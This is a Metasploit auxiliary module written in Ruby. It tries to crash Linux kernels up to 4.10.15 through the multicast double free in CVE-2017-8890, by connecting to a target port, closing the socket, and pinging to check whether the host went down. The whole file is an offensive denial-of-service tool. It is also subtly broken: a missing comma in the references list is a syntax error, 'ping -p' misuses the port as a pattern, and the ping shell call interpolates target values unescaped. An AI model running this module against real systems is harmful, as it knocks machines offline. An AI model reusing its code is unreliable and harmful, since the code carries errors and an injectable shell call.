##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'socket'
include Socket::Constants

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super( update_info( info,
      'Name'           => 'Linux Multicast DoS',
      'Description'    => %q{
	Linux kernel versions 4.10.15 and below leave an extra copy of a multicast socket object
		at accept() time, if the MULTICAST_JOIN_GROUP option is set on the listening socket. Upon closing the connection, a double free occurs, leading to kernel panic.

	The target system must be of kernel version less than or equal to 4.10.15.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          '<syzkaller>', # Google's kernel fuzzer found this vulnerability
          '7043mcgeep <patrick.j.mcgee@marquette.edu>' # MSF module
        ],
      'Platform'       => ['linux'],
      'DisclosureDate' => '2017-05-10',
      'References'     =>
        [
          ['BID', '98562'],
          ['CVE', '2017-8890'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-8890'],
          ['URL', 'https://www.rapid7.com/db/vulnerabilities/debian-cve-2017-8890'],
          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ipv4/inet_connection_sock.c?h=v4.10#n668']
          ['URL', 'https://thinkycx.me/posts/2018-10-30-a-glance-at-CVE-2017-8890.html'],
          ['URL', 'https://github.com/torvalds/linux/commit/657831ffc38e30092a2d5f03d385d710eb88b09a']
        ]
      ))
  end

  # Simply ping the target machine
  def ping_exec(addr, port, status)
    print_status("Pinging the target machine.")
    reply = `ping -c 1 #{addr} -p #{port}` # Ping runs only once
    if reply.include? "1 packets transmitted, 1 received"
      print_good("Target machine is running.")
    elsif status == "pre-connect"
      print_error("Error: ping received no reply from target machine.")
    else
      print_good("No reply from target machine post-connection.")
    end
  end
    
  def run
    addr = datastore['RHOST']
    port = datastore['RPORT']

    ping_exec(addr, port, "pre-connect")

    # Prepare the client socket
    client_socket = Socket.new(AF_INET, SOCK_STREAM, 0)
    serveraddr = Socket.sockaddr_in(port, addr) # Server address and port
    clientaddr = Socket.sockaddr_in(0, '') # Client addr is => INADDR_ANY
    client_socket.bind(clientaddr) # Bind client address
    ret = client_socket.connect(serveraddr) # Connect to server
    if ret == 0
      print_good("Connection successfuly established with #{addr}:#{port}")
    else
      print_error("Failed to connect to #{addr}:#{port}")
    end

    client_socket.close
    
    # TODO: Figure out how to properly sleep
    #print_status("Waiting for 10 seconds...")
    #Rex.sleep(10)

    ping_exec(addr, port, "post-connect") # No reply if kernel panicked
    	
  end
end
